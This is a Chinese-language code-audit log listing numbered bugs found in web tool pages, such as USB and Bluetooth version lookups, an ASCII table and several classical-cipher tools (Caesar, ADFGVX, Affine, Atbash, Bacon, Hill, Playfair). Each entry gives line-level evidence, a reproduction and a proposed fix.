- 留存建议（bluetooth-version）：①选项由数据表 key 驱动生成（根治空下拉）；②补齐 1.x/2.x/3.0/4.0/4.1 或对未收录版本明确提示；③"数据表"页签当前切换的是 `#result` 而非 `#bluetooth_versionTable`，建议改为真正的表格面板。

### IT-N133 USB 版本速查：三个下拉框没有任何 `<option>`，版本/对比版本/接口类型完全无法选择（高，确认源码缺陷）
- 问题：`#v`、`#v2`、`#conn` 均为空 `<select>`，全页无 `<option>`、无动态填充；`calcTool()` 依赖 `|| '3.2'`、`|| '2.0'`、`|| 'usbc'` 兜底，结果永远是"3.2 vs 2.0 + USB-C"。
- 证据：`tools/it/usb-version.html:129`、`tools/it/usb-version.html:133`、`tools/it/usb-version.html:137`（空 select）、`tools/it/usb-version.html:271-273`（读值 + 兜底）、`tools/it/usb-version.html:307-309`（reset 置 −1）
- 复现（Node 静态校验）：`<select id="v">`、`<select id="v2">`、`<select id="conn">` 内部文本长度均为 0，全页 `<option` 计数为 0，`appendChild`/`new Option` 计数也为 0；打开页面三个下拉均无项，点"计算"结果不变。期望至少 2.0/3.0/3.1/3.2/4.0 与 usbc/typea/micro。
- 影响：与蓝牙页同型——核心选择器不可用，工具只剩一张固定默认结果。
- 方案：boot 时按 `info` 的 key 生成 option，接口类型用固定三项；HTML 亦可直接写死。

### IT-N134 USB 版本速查：数据表缺 1.0/1.1（图表与页内表格却有），回退 3.2/2.0；`connNote` 把 USB 2.0 + USB-C 判成"仅承载较低速率"（中，确认源码缺陷）
- 问题：`info` 只有 `2.0/3.0/3.1/3.2/4.0`，缺 1.0/1.1；`row=info[v]||info['3.2']` 会把 1.x 显示成 3.2 的 20 Gbps。另 `connNote.usbc = parseFloat(v)>=3.1 ? '支持全速率' : 'USB-C 仅承载较低速率'`：接口形态并不限制速率，USB 2.0 的 USB-C 口也能跑满 480 Mbps，"仅承载较低速率"表述错误；同法 `typea`/`micro` 的数值门槛也与事实不符（Micro-B 也有 USB 3.0 版本）。
- 证据：`tools/it/usb-version.html:274-281`（info 表与回退）、`tools/it/usb-version.html:282`（connNote）、`tools/it/usb-version.html:363-364`（图表却含 1.1/12 Mbps）
- 复现（Node 复算）：`v='1.1'` → 实际 20 Gbps / USB-C / 240W（均为 3.2 行）；`v='2.0', conn='usbc'` → 实际"USB-C 仅承载较低速率"，期望"USB-C 形态不限制速率，受协议/线材约束"。
- 影响：补选项后会把 1.1 说成 20 Gbps；接口建议把形态与协议混为一谈，选型结论可能相反。
- 方案：补齐 1.0/1.1 行；未收录显示"暂无数据"；`connNote` 改为"Type-C 支持最高 240W 供电（PD 3.1），速率取决于协议与线材"等不依赖版本门槛的表述。

### IT-N135 USB 版本速查：把 3.1 简写成 10 Gbps，与自身引据"3.0/3.1 已更名为 3.2 Gen1/Gen2"矛盾（低，确认源码缺陷）
- 问题：`info['3.1']=['10 Gbps',…]` 与底部说明"3.1 10G"把 USB 3.1 等同于 Gen2；但 USB-IF 命名里 3.1 Gen1 仍是 5 Gbps，只有 Gen2 是 10 Gbps；引据表也写"3.0 and 3.1 were renamed to 3.2 Gen1 and Gen2"。
- 证据：`tools/it/usb-version.html:276-277`（3.1=10 Gbps）、`tools/it/usb-version.html:228`（"3.1 10G"）、`tools/it/usb-version.html:213`（引据）
- 复现：阅读同页"命名演进"引据与 3.1 行 → 无法解释 3.1 Gen1（5 Gbps）落在哪一行；期望标注 "3.1 Gen1 = 5 Gbps / Gen2 = 10 Gbps"。
- 影响：选购扩展坞/硬盘盒时按"3.1=10G"预期，买到 Gen1 实际只有 5 Gbps。
- 方案：拆成 `3.1 Gen1 (5 Gbps)` 与 `3.1 Gen2 (10 Gbps)`，或统一改用 3.2 Gen1/Gen2/Gen2x2 命名并保留旧名括注。

- 留存建议（usb-version）：①option 由数据表驱动生成；②补 1.0/1.1 与 3.2 Gen1/Gen2/2x2 细分；③接口建议与协议速率解耦（形态≠速率），并把"数据表"页签指向真正的表格。

### IT-N136 ASCII 码表：meta 三处承诺"点击即可复制对应编码"，实际点击只弹详情、没有任何剪贴板调用（中，确认源码缺陷）
- 问题：卡片 `onclick="showDetail(${i})"` 只更新详情面板；全页检索无 `navigator.clipboard`、无 `copy`、无"复制"按钮/提示。meta/og/twitter 三处却都写"点击即可复制对应编码"。
- 证据：`tools/it/ascii-table.html:10`、`tools/it/ascii-table.html:15`、`tools/it/ascii-table.html:76`（三处承诺）、`tools/it/ascii-table.html:302`（仅 `showDetail`）、`:310-324`（详情渲染，无复制）
- 复现：点 65 号卡片 → 实际只有详情面板变化（字符/十进制/十六进制/八进制/二进制/HTML 实体/URL 编码），剪贴板不变、无 toast；期望按 meta 复制编码（如 `65` 或 `0x41`）。
- 影响：核心卖点缺失，用户需手工拖选；SEO 描述与实际功能不符。
- 方案：`showDetail()` 末尾调用 `navigator.clipboard.writeText(...)` 并 toast，或每张卡片加独立"复制"按钮（复制 `0x41`）。

### IT-N137 ASCII 码表："扩展 (128-255)"页签按 Unicode 码点渲染，与 FAQ"128–255 各家不兼容、需查 Unicode"自相矛盾（中，确认源码缺陷）
- 问题：`render()` 对 128–255 用 `String.fromCharCode(i)`（即 U+0080~U+00FF），128–159 显示 `·`，160–255 显示 Latin-1 字符；这不是任何"扩展 ASCII 代码页"（Windows-1252 在 128–159 有 €、™ 等，与 Latin-1 控制区完全不同）。FAQ 却回答"128–255 属于扩展 ASCII（各家互不兼容）…需查 Unicode 码表"。
- 证据：`tools/it/ascii-table.html:172`（扩展页签）、`tools/it/ascii-table.html:292-297`（`fromCharCode` 与 `i>127&&i<161 → '·'`）、`tools/it/ascii-table.html:226`（FAQ 说法）
- 复现：切"扩展 (128-255)" → 128–159 全部显示 `·`，160 起显示 `¡¢£…`（Latin-1）；点 128 号 → 详情显示原始控制字符（不可见）。期望要么移除该页签，要么标注"Latin-1 参考，非扩展 ASCII"。
- 影响：用户把 Latin-1 当作"扩展 ASCII"，在 Windows-1252 环境（€ 在 0x80）下得到错误映射。
- 方案：页签改为"Latin-1 (ISO-8859-1) 参考"并注明 128–159 为控制区；或提供 Latin-1 / Windows-1252 双选项并显示对应字符。

### IT-N138 ASCII 码表：分类页签边界与标签错位（"控制 0-31"实际含 32，"可打印 32-127"实际含 127/DEL）（低，确认源码缺陷）
- 问题：`getRange()` 返回 `[0,32]`（右开，含 32 空格）与 `[32,128]`（含 127 DEL）；按钮却写"控制字符 (0-31)"、"可打印 (32-127)"，FAQ 与 formula-list 又写"32–126 为可打印"。
- 证据：`tools/it/ascii-table.html:170-171`（按钮标签）、`tools/it/ascii-table.html:281-286`（区间）、`tools/it/ascii-table.html:159`、`:225`（"32–126 可打印"）
- 复现：点"控制字符 (0-31)" → 实际末尾出现 32 `␣`；点"可打印 (32-127)" → 实际末尾出现 127 `DEL`（应为控制字符）。期望 0–31、32–126 两区间严格对应。
- 影响：分类边界错位，按"可打印"筛选时会混入 DEL，复制/比对时产生不可见字符。
- 方案：改为 `[0,32)`、`[32,127)`，按钮标签同步为 "0-31" / "32-126"。

- 留存建议（ascii-table）：①实现真正的点击复制（编码或字符二选一，带 toast）；②扩展区改标 Latin-1/Windows-1252 并给映射来源；③补"输入任意字符反查码点"与可打印/控制统计。

### IT-N139 凯撒密码：关闭"仅字母移位"时解密仍按 mod 26 取反向位移（应 mod 95），加解密不可逆（高，确认源码缺陷）
- 问题：`caesarShift()` 先算 `dir = (26 - s) % 26`，再在 `onlyAlpha=false` 分支用 `(code-32+dir)%95+32`；加密用 `+s mod 95`、解密用 `+(26-s) mod 95`，两者合计 26 而非 95 的倍数，无法还原。所有 1–25 位移都错（净偏移恒为 26）。
- 证据：`tools/it/caesar-cipher.html:343-344`（方向计算）、`tools/it/caesar-cipher.html:353-361`（mod 95 分支）、`tools/it/caesar-cipher.html:374`（解密调用）
- 复现（Node 复算页内函数，`onlyAlpha=false, preserveCase=true`）：`Hello, World! 2024` shift 3 加密 → `Khoor/#Zruog$#5357`；再以 shift 3 解密 → 实际 `b ''*F:q*-'~;:LJLN`（期望还原 `Hello, World! 2024`）。`Hello` shift 13 → `Uryy|`，解密 → `b ''*`。
- 影响：一旦取消勾选"仅字母移位"，解密/暴力破解全部输出乱码，用户会以为密文损坏；这也是本页第二个模式的核心功能。
- 方案：按字母表大小取逆：`const base = onlyAlpha ? 26 : 95; const dir = encrypt ? s % base : (base - s % base) % base;`；补 `onlyAlpha=false` 的加解密往返用例（至少 shift 3/13/25）。

### IT-N140 凯撒密码：TBKit 数据表/趋势图/导出 CSV 恒为空（`__caesar_cipherResText` 读 textarea 的 textContent）（中，确认源码缺陷）
- 问题：结果写入 `#output.value`，而 `__caesar_cipherResText()` 读 `#output.textContent`（空 textarea 恒为空）→ `__caesar_cipherExtras()` 在 `if(!res) return` 处退出，`TBKit.history.record` 与 `__caesar_cipherRender` 从不执行。
- 证据：`tools/it/caesar-cipher.html:195`（空 `<textarea id="output">`）、`tools/it/caesar-cipher.html:573-579`（读 textContent）、`tools/it/caesar-cipher.html:630-631`（`if(!res) return`）、`tools/it/caesar-cipher.html:652-655`（导出依赖空表）
- 复现：加密 `Hello` → 输出 `Khoor`；切 TBKit 历史/查看数据表 → 无记录；点"导出明细 CSV"无文件无提示。期望一行"输入/移位/模式/结果"并可导出。
- 影响：与页面自带的 localStorage 历史并存但完全空转，用户看到两套历史、其中一套永远空；CSV 导出是死按钮。
- 方案：改读 `.value`；包装 `process()` 而非仅 `setMode()` 触发 extras；导出改为本次结果而非历史表。

### IT-N141 凯撒密码：`oninput` 每次按键都写 localStorage，20 条上限被同一段输入的前缀刷满（中，确认源码缺陷）
- 问题：`<textarea id="input" oninput="process();">`，`process()` 无条件 `saveHistory(input, result, …)`；`saveHistory` 只与"最新一条"去重，不防抖，因此输入 `Hello` 会依次落下 `H`、`He`、`Hel`、`Hell`、`Hello` 5 条记录。
- 证据：`tools/it/caesar-cipher.html:191`（`oninput`）、`tools/it/caesar-cipher.html:376`（无条件 save）、`tools/it/caesar-cipher.html:458-475`（仅与首条比较）、`tools/it/caesar-cipher.html:312`（`MAX_HISTORY=20`）
- 复现：清空历史后逐字输入 `Hello` → 实际历史 5 条（每条都是前缀）；20 字符的输入即可占满全部容量，真实历史被挤出。
- 影响：历史功能基本不可用，且每次按键同步写 localStorage（长文本输入有卡顿风险）。
- 方案：改为失焦/点击按钮/500ms 防抖后写入；`MAX_HISTORY` 提到 50 或按"完整输入"去重（同一 session 只留最终值）。

### IT-N142 凯撒密码：TBKit 历史回填调用 `setMode()` 无参 → `currentMode=undefined`、标签变"密文/破解结果"、按解密重算（低，确认源码缺陷）
- 问题：`TBKit.history.mount` 的回填回调末尾调用 `setMode()`（无参数），函数内 `currentMode = mode` 即 `undefined`；随后三个按钮全部取消 active，`inputLabel` 走 else 分支变"密文"、`outputLabel` 变"破解结果"，`process()` 里 `encrypt = currentMode==='encrypt'` 为 false，按解密计算。
- 证据：`tools/it/caesar-cipher.html:609`（`setMode();`）、`tools/it/caesar-cipher.html:314-334`（无参时的分支）、`tools/it/caesar-cipher.html:373-374`
- 复现：在 TBKit 历史面板点一条"加密"记录 → 实际模式按钮无高亮、标签显示"密文/破解结果"、结果按解密方向计算；期望恢复原 `mode` 并高亮"加密"。
- 影响：从历史恢复后状态错乱，用户再点"加密"才恢复；与自带 `loadHistory()` 的行为不一致。
- 方案：`setMode(rec.mode || 'encrypt')`，或从 `snap` 里带出 `mode` 字段一并回填。

- 留存建议（caesar-cipher）：①解密方向按字母表大小（26/95）计算并补往返用例；②历史写入加防抖、容量改为按完整输入去重；③统一两套历史（自带 localStorage 与 TBKit），去掉重复面板。

- 备注：`tools/it/base58-encode.html:327` 与 `tools/it/base85-encode.html:360` 的复制按钮仍依赖 Chrome 专有全局 `event`（Firefox/程序化调用会失效），与 IT-N31 同模式，不重复计数、未单列。`tools/it/barcode-upc.html:245-246` 自建 `L_CODES/R_CODES` 与 `js/barcode-lib.js:101-106` 重复，且未加载共享库，属 N127/N128 的根因。

- 覆盖小结：本轮实读 8 页（base58-encode、base85-encode、barcode-code128、barcode-upc、bluetooth-version、usb-version、ascii-table、caesar-cipher），新增 26 条（高 3 / 中 13 / 低 10），编号 IT-N117~IT-N142。未覆盖：本分区其余约 265 页（含 http-methods、gitignore/dockerfile 生成器、shell-script-formatter、各类加密/编码页与全部速查表页）；未做浏览器、英文态、繁体、移动端、门禁与线上部署验证。

## 2026-11-04 续查（并行批 P-2）

- 范围：`tools/it/` 下 8 个古典密码页（adfgvx-cipher、affine-cipher、atbash-cipher、bacon-cipher、hill-cipher、playfair-cipher、rail-fence-cipher、vigenere-visualizer），逐页完整读取 HTML、内联 JS、deep-dive 与 FAQ；编号续接 P 批第一波最大号 IT-N142，本批新增 IT-N143~IT-N166。
- 方法：纯静态阅读 + `node -e`/`node /tmp/*.js` 按页内算法逐函数复算；未开浏览器、未跑构建、未做 git 写。

### IT-N143 ADFGVX 解密列还原用错置换表，非对合密钥（含默认 CIPHER）加解密不可逆（高，确认源码缺陷）
- 问题：加密按「目标名次→原始列」读取，用 `order.indexOf(target)`；解密却按「第 i 个密文块→`order[i]`」回填。`order[i]` 是原始列 i 的名次，不是名次 i 对应的原始列，二者只在置换恰好为对合时相等。默认 `transKey=CIPHER` 的 `order=[0,3,4,2,1,5]`，名次 2 应回填原始列 2，代码却回填 4，名次与原始列被互换。
- 证据：`tools/it/adfgvx-cipher.html:298-304`（加密 `order.indexOf(target)`）、`tools/it/adfgvx-cipher.html:319-327`（解密 `const targetCol = order[i]`）、`tools/it/adfgvx-cipher.html:267-277`（`getTransOrder`）、`tools/it/adfgvx-cipher.html:174`（默认 `value="CIPHER"`）
- 复现（Node 复算页内函数）：默认 `transKey=CIPHER`，输入 `ATTACKATDAWN` 加密得 `AAAA DVFA DGDF DDDD DADF DGXA`；再点“解密”实际输出 `ATTNOGABM18E`，期望 `ATTACKATDAWN`。换 `FRANCE` 同样失败；`LEMON` 因 `order` 恰为对合才偶然正确。
- 影响：默认配置下用户无法解开自己刚生成的密文；任何非对合密钥全部解错，且错位后还会从 6×6 方阵里取到数字，输出看似“合法密文”，误导性很强。
- 方案：解密改为 `const targetCol = order.indexOf(i);`（与加密互逆），并为 `CIPHER`/`FRANCE`/`LEMON` 补加解密往返用例；`getTransOrder` 可同时缓存逆置换避免重复 `indexOf`。

### IT-N144 ADFGVX 解密不剥除补位 X，尾部被当作正文解码（中，确认源码缺陷）
- 问题：加密用 `while(intermediate.length < numRows*numCols) intermediate += 'X'` 补齐整行；解密按矩阵还原全部中间串后逐对解码，没有记录/剔除补位长度，补位字母会继续走方阵映射变成正文。
- 证据：`tools/it/adfgvx-cipher.html:291-297`（补 X）、`tools/it/adfgvx-cipher.html:328-340`（解密全量解码，无剥除）
- 复现（Node 复算）：`transKey=LEMON`，输入 `HIJ` → 密文 `XX AD GX VX XX` → 解密实际 `HIJYY`（5 字符），期望 `HIJ`。补位对经方阵映射后不一定还原成 X，会变成任意字母。
- 影响：凡中间串长度不是列数整数倍（大多数字符数都会出现），解密结果尾部多出 1–N 个无意义字母，用户无法判断哪些是填充。
- 方案：加密时把补位个数存入输出（如前置 `rows*cols - intermediate.length` 标记或写进历史），解密按该数在分对前截断；至少在 UI 提示“末尾补位需手动删除”。

### IT-N145 ADFGVX 三个预设把 36 格方阵密钥写成 KEY/SECRET/BREAK，被 `getGrid()` 静默忽略（低，确认源码缺陷）
- 问题：`getGrid()` 仅当去噪后长度恰为 36 才采用，否则回退 `DEFAULT_KEY`；预设一/二/三分别写入 `key=KEY`、`SECRET`、`BREAK`，长度都不足 36，方阵永远不变，但输入框里确实填了值。
- 证据：`tools/it/adfgvx-cipher.html:257-261`（长度 36 才生效）、`tools/it/adfgvx-cipher.html:484-487`（三个非法 key）、`tools/it/adfgvx-cipher.html:170-171`（占位提示“36 个字符”）
- 复现：点“示例一”→ `key` 输入框显示 `KEY`，右侧 6×6 方阵仍为默认 `NA1C3H...`；期望预设切换方阵或明确提示“需 36 字符，当前已回退默认”。
- 影响：预设演示“自定义方阵”名不副实，用户以为换了密钥但密文与默认完全相同。
- 方案：给预设填一个真实 36 字符置换（如打乱的 0-9A-Z），或移除预设里的 `key` 字段；同时在输入框失焦时提示长度不合法并显示“使用默认方阵”。

- 留存建议（adfgvx-cipher）：①修正解密列映射并补三组密钥往返用例；②补位剥离或显式提示；③自定义方阵改为长度校验 + 可视化预览。

### IT-N146 Affine `a` 输入框清空触发 `gcd(NaN,26)` 无限递归，栈溢出（中，确认源码缺陷）
- 问题：`gcd` 只有 `b===0` 出口，无 `NaN`/非有限数保护；`renderGrid()` 与 `enc()` 都会调用 `gcd(a,26)`。数字框允许被清空，`parseInt('')` 得 `NaN`，`gcd(NaN,26) → gcd(26,NaN) → gcd(NaN,NaN) → …` 永不终止。
- 证据：`tools/it/affine-cipher.html:254`（递归 gcd）、`tools/it/affine-cipher.html:269`（enc 校验）、`tools/it/affine-cipher.html:304/311`（renderGrid 调用）、`tools/it/affine-cipher.html:169`（`oninput="renderGrid()"`）
- 复现（Node 复算）：`gcd(NaN,26)` 抛 `RangeError: Maximum call stack size exceeded`。页面操作：选中 `a` 框内容按 Backspace 清空 → 控制台立即栈溢出，映射表停在旧值，无任何提示；此时点“加密”同样抛错而非弹“a 必须与 26 互素”。
- 影响：清空/重输参数是常规操作，每次清空都会产生未捕获异常，映射表与按钮反馈失真，弱设备可能卡顿。
- 方案：先判 `Number.isInteger(a) && Number.isInteger(b)`，非法时仅显示红色提示、不调用 `gcd`；或把 gcd 改为迭代并加 `Number.isFinite` 守卫。

### IT-N147 Affine `b` 输入框清空后输出全为 NUL 字符，界面看似“空结果”且无告警（中，确认源码缺陷）
- 问题：`b` 被清空时 `parseInt` 得 `NaN`，加密/映射表执行 `String.fromCharCode(((a*i+NaN)%26)+65)`；`String.fromCharCode(NaN)` 返回 `\u0000`，26 个映射格与整段密文都变成不可见 NUL，现有 `NaN` 守卫只检查 HTML 字符串里是否出现字面量 `NaN`，捕不到真正的 NUL。
- 证据：`tools/it/affine-cipher.html:268`（读 b）、`tools/it/affine-cipher.html:273/275`（加密）、`tools/it/affine-cipher.html:309`（映射表）、`tools/it/affine-cipher.html:313`（无效值守卫）
- 复现（Node 复算）：`a=5,b=NaN`，`AFFINE` 六个字母全部变成 charCode 0。页面操作：清空 `b` 后映射表空格、加密结果肉眼为空，无错误提示。
- 影响：用户以为工具坏了或输出被吞；复制到别处得到一串不可见控制字符，可能污染下游文本。
- 方案：`b` 必须通过 `Number.isInteger(b) && b>=0 && b<=25` 校验，非法时禁用加密并显示红字；`renderGrid` 同样先校验。

### IT-N148 Affine 密钥 `a` 允许输入负数/超范围，负码点被写成数字与标点（中，确认源码缺陷）
- 问题：`min="1" max="25"` 只约束微调按钮，键盘仍可键入 `-5`；加密未把 `a` 归一化到 0–25，`(a*x+b)%26` 保持 JavaScript 负数余数，`fromCharCode(负值+65)` 落到 ASCII 数字/标点区。
- 证据：`tools/it/affine-cipher.html:169`（`min="1" max="25"`）、`tools/it/affine-cipher.html:273-275`（未归一化直接取模）、`tools/it/affine-cipher.html:269`（只校验 gcd，负奇数与 26 仍互素）
- 复现（Node 复算）：`a=-5,b=8`，加密 `AFFINE` 实际 `I00;<5`，期望在 1–25 内给出字母，或拒绝负数。
- 影响：`gcd(-5,26)=1` 通过校验，用户得到含数字/分号的“密文”，解密也会因负索引错乱；属于静默错误而非报错。
- 方案：读取后先 `a = ((a % 26) + 26) % 26`，再校验 `1..25` 且与 26 互素；同时用 `input` 事件过滤非数字字符。

- 留存建议（affine-cipher）：①参数校验统一收口（整数、范围、互素），拒绝空值/负数；②补 a=3/5/7/11/15/17/19/21/23/25 与 b=0/25 的往返用例；③映射表增加“当前 a,b 已回退/无效”状态。

### IT-N149 Atbash 原理区称“本质上是凯撒密码位移 13 的特例”，与两种映射的实际关系不符（中，确认源码缺陷）
- 问题：Atbash 是自反置换 `f(x)=25-x`（A→Z、B→Y）；凯撒位移 13（ROT13）是 `f(x)=x+13`（A→N）。两者都满足“二次还原”，但映射完全不同，不能称 Atbash 是 ROT13 的特例。
- 证据：`tools/it/atbash-cipher.html:245`（“本质上是凯撒密码在位移为13时的特例”）、`tools/it/atbash-cipher.html:351-359`（实际 `90 - code` / `122 - code`）
- 复现：按页面自身实现，`A` 加密为 `Z`；若按“位移 13 的特例”，`A` 应为 `N`。页面示例 1 的 `HELLO → SVOOL` 也证明不是 ROT13（ROT13 为 `URYYB`）。
- 影响：古典密码教学页面的核心概念错误，会误导初学者把“自反”与“ROT13”混为一谈。
- 方案：改为“Atbash 是字母表镜像置换 f(x)=25−x，与 ROT13 同为对合置换，但映射不同；ROT13 的 A→N，Atbash 的 A→Z”，并保留示例 3 的自反验证。

### IT-N150 Atbash / Playfair / Vigenère 三页 `oninput` 每次按键都写 localStorage，20 条上限被输入前缀刷满（中，确认源码缺陷）
- 问题：三页都把 `process()/transform()` 直接绑到输入框 `oninput`，且保存逻辑只在“与最新一条完全相同”时去重（Vigenère 连这层去重都没有）。每敲一个字符输入就变一次，于是 `H`、`He`、`Hel`… 逐条落库。
- 证据：`tools/it/atbash-cipher.html:180`（oninput）、`tools/it/atbash-cipher.html:367-369`（无条件 save）、`tools/it/atbash-cipher.html:423-425`（仅比首条 input）；`tools/it/playfair-cipher.html:205`、`tools/it/playfair-cipher.html:506-508`、`tools/it/playfair-cipher.html:648-650`；`tools/it/vigenere-visualizer.html:186`、`tools/it/vigenere-visualizer.html:433-435`、`tools/it/vigenere-visualizer.html:631-645`（完全无去重）
- 复现：清空历史后逐字输入 `Hello` → Atbash/Playfair 实际新增 5 条（每条为前缀），Vigenère 同样 5 条；输入 20 字符即占满 `MAX_HISTORY=20`，此前的真实记录全部被挤出。
- 影响：历史面板基本不可用；每次按键同步 `localStorage.setItem` + 重建 DOM，长文本输入有卡顿风险。
- 方案：改为 500ms 防抖或失焦/点击“转换”时写入；按最终完整输入去重（同一会话只保留最新一条），容量提高或按 hash 去重。

### IT-N151 Atbash / Playfair / Vigenère 的 TBKit 历史回填调用 `setMode()` 无参，模式变 `undefined`（低，确认源码缺陷）
- 问题：三页 `TBKit.history.mount` 的回填回调末尾都调用 `setMode()`（无参数）。`setMode` 内 `currentMode = undefined`，随后所有模式按钮失去 active；Atbash 标签走 else 变“输入文本/转换结果”，Playfair/Vigenère 标签变“密文/明文”，且 `process()` 中 `encrypt=false`，按解密方向重算。
- 证据：`tools/it/atbash-cipher.html:553`、`tools/it/atbash-cipher.html:332-349`；`tools/it/playfair-cipher.html:779`、`tools/it/playfair-cipher.html:381-389`；`tools/it/vigenere-visualizer.html:770`、`tools/it/vigenere-visualizer.html:344-352`
- 复现：在 TBKit 历史面板点一条“加密”记录 → 实际无按钮高亮、标签反转、结果按解密计算；期望恢复记录里的 `mode` 并高亮对应按钮。
- 影响：从 TBKit 历史恢复后状态错乱，与页面自带 `loadHistory()` 的行为不一致，用户需再点一次模式按钮才能恢复。
- 方案：`setMode(rec.mode || 'encrypt')`，并把 `mode` 一并写入 `TBKit.history.record` 的 `snap`。

- 留存建议（atbash-cipher）：①修正“ROT13 特例”表述；②历史写入防抖；③补“自反性一键验证”按钮（同一输入连续转换两次比对）。

### IT-N152 Bacon 只实现 26 字母二进制表，页面宣称的 24 字母版缺失，FAQ 对两版差异的说明也错误（中，确认源码缺陷）
- 问题：`TABLE` 由 `i.toString(2).padStart(5,'0')` 生成 0–25，即 A=00000…I=01000、J=01001…Y=11000、Z=11001；页面 formula-list 却写“24 字母版中 I/J 与 U/V 同码”，FAQ 进一步说“26 字母版则把剩余两个组合分配给 J 和 V”。实际 26 字母版是拆开 I/J 与 U/V、把后续字母整体顺延，码 24/25 落在 Y/Z，并不存在“剩余两个组合分给 J/V”。
- 证据：`tools/it/bacon-cipher.html:261-268`（唯一映射表）、`tools/it/bacon-cipher.html:148`（宣称两版）、`tools/it/bacon-cipher.html:213`（FAQ 错误说法）
- 复现（Node 复算）：24 字母版 `K = abaab`（二进制 01001），本页解码 `abaab` 得 `J`，期望 `K`；`I/J`、`U/V` 归并的 24 字母密文整段后移一位，K–Z 全部解错。页面无版本选择器。
- 影响：用户拿经典培根 24 字母表来解码会得到系统性错字；页面又声称支持两版，属于文档与实现不一致。
- 方案：增加“24 字母（I/J、U/V 同码）/26 字母（独立码）”切换，24 版按 0–23 建表；FAQ 改为“26 字母版把 I/J、U/V 拆开，K 起整体顺延，Y/Z 使用 11000/11001”。

### IT-N153 Bacon 编码静默丢弃所有非 A–Z 字符（空格、标点、数字），不提示丢了多少（低，确认源码缺陷）
- 问题：`enc()` 遍历输入但只在 `TABLE[ch]` 命中时输出，`else` 分支不存在；空格、标点、中文、数字全部被无声删除，输出长度随之缩短。
- 证据：`tools/it/bacon-cipher.html:271-284`（无 else/无计数）、`tools/it/bacon-cipher.html:174`（占位说“输入要编码的文本”）
- 复现：输入 `HELLO WORLD!` → 输出仅 10 个字母的编码，空格与 `!` 消失，页面无任何提示；期望保留分隔或提示“已忽略 2 个非字母字符”。
- 影响：含空格短句编码后无法从输出看出原词边界，用户误以为编码器漏字。
- 方案：统计并 toast 提示被忽略字符数；或提供“保留非字母原样”选项（解码端已能忽略非 a/b 字符，兼容）。

- 留存建议（bacon-cipher）：①补 24/26 版本切换并修正 FAQ；②编码增加“丢弃字符”提示；③映射表补 A/B 大写列（当前只展示 a/b 与 0/1，与 upper 模式不一致）。

### IT-N154 Hill deep-dive 算例 “HI → LM” 与矩阵复算结果不符，正确应为 LN（中，确认源码缺陷）
- 问题：正文示例给矩阵 `[[3,2],[5,7]]`、`H=7,I=8`，第二分量 `5*7+7*8=91`，`91 mod 26 = 13 = N`，页面却写 `LM`（`M` 对应 12）。
- 证据：`tools/it/hill-cipher.html:210`（示例文字）、`tools/it/hill-cipher.html:281-293`（`process()` 同一算式）
- 复现（Node 复算）：`hill([3,2,5,7], 'HI')` → `LN`；第一分量 `3*7+2*8=37 mod 26=11=L` 与页面一致，仅第二分量算错。
- 影响：教学算例与工具自身输出矛盾，用户照算例手算会得到不同答案。
- 方案：把示例改为 `HI → LN`，并在括号里补 `91 mod 26 = 13 → N`。

### IT-N155 Hill 密钥矩阵不校验/归一化负数与超范围整数，加密输出数字与控制字符（中，确认源码缺陷）
- 问题：`getMatrix()` 只检查“4 个且非 NaN”，接受 `-3`、`100` 等任意整数；`process()` 直接 `(m[0]*p1+m[1]*p2)%26`，负积得负余数，`fromCharCode(负值+65)` 落到 ASCII 数字/标点区。
- 证据：`tools/it/hill-cipher.html:295-299`（getMatrix 无范围校验）、`tools/it/hill-cipher.html:281-291`（未归一化取模）、`tools/it/hill-cipher.html:171`（纯文本输入，无 pattern）
- 复现（Node 复算）：`key=-3,3,2,5`，输入 `HELP` → 实际 `8IMT`（首字符 charCode 56），期望在 0–25 内给出字母或拒绝该矩阵。
- 影响：用户可输入负数做“模 26”实验，却得到含数字的伪密文；后续解密同样可能生成控制字符，且 `renderInfo()` 的行列式还可能显示负值。
- 方案：读取后对每个元素做 `((x % 26) + 26) % 26`，并校验为整数；`det()` 同样先归一化，UI 显示 0–25 的规范矩阵。

### IT-N156 Hill 文档称支持 2×2 或 3×3，实际仅 4 数字/2×2；小数被 `parseInt` 静默截断（低，确认源码缺陷）
- 问题：deep-dive 写“用 2×2 或 3×3 矩阵做加解密”，但输入框只收 4 个数字，`getMatrix()` 长度必须为 4，`process()` 固定按 2 个一组；另 `parseInt('3.7')` 得 3，用户输入小数会被悄悄改成整数。
- 证据：`tools/it/hill-cipher.html:208`（3×3 说法）、`tools/it/hill-cipher.html:170-171`（“4 个数字”）、`tools/it/hill-cipher.html:295-298`（长度 4 + parseInt）、`tools/it/hill-cipher.html:281-293`（固定 2 分组）
- 复现：输入 `3.7,3,2,5` → 实际按 `3,3,2,5` 计算且无提示；期望拒绝非整数或明确提示已取整。输入 9 个数字 → 直接弹“请输入 4 个数字”。
- 影响：文档承诺的 3×3 教学场景无法使用；小数密钥的静默取整会让结果与用户预期不符。
- 方案：删除 3×3 表述，或按数字个数支持 2×2/3×3；`Number()` + `Number.isInteger` 校验并在 UI 提示。

- 留存建议（hill-cipher）：①修正 LN 算例；②矩阵元素统一 mod 26 并校验整数；③补 3×3 或删掉该承诺，同时在“矩阵信息”里显示规范化后的矩阵。

### IT-N157 Playfair 密文未校验偶数长度，非字母输入会中断（高）
- `tools/it/playfair-cipher.html:481-491` 解密时未校验清洗后的密文：输入 `Z` 会将缺失的第二字符传给 `processPair()`，输出 `Tundefined`；输入 `123` 时 `.match()` 返回 null，调用 `.map()` 抛出 TypeError，Node 执行页面原函数已复现。
- `prepareText()` 在明文字母对均为 `X` 时仍补 `X`（`:424-437`），产生同字母对；应使用其他填充字母，并明确说明解密保留填充字符。解密应在分组前检查有效字符及偶数长度，非法时清空旧输出并提示。

### IT-N159 Playfair 原理区 “26×26=676 种字母对” 与自身 5×5/I-J 合并（25×25=625）矛盾（中，确认源码缺陷）
- 问题：正文说“Playfair 有 26×26=676 种可能的字母对”，但同一页明确 5×5 方阵、I/J 共用一格，实际字母表 25 个，双字母组合是 25×25=625。
- 证据：`tools/it/playfair-cipher.html:275`（676 说法）、`tools/it/playfair-cipher.html:184`（I/J 合并）、`tools/it/playfair-cipher.html:395-413`（buildGrid 去 J 后 25 格）
- 复现：按 `buildGrid('PLAYFAIR')` 实得 25 个字母，任意两格有序组合 625；页面却用 676 解释频率分析难度。
- 影响：教学数字错误，夸大约 8% 的组合空间；与页面自身的方阵构造直接冲突，细心的读者会质疑整页可信度。
- 方案：改为 25×25=625，并补一句“若使用 6×6 含数字变体则为 36×36=1296”。

### IT-N160 Playfair deep-dive 示例 “HI → BM” 未给密钥且与默认密钥实算 EB 不符（低，待验证）
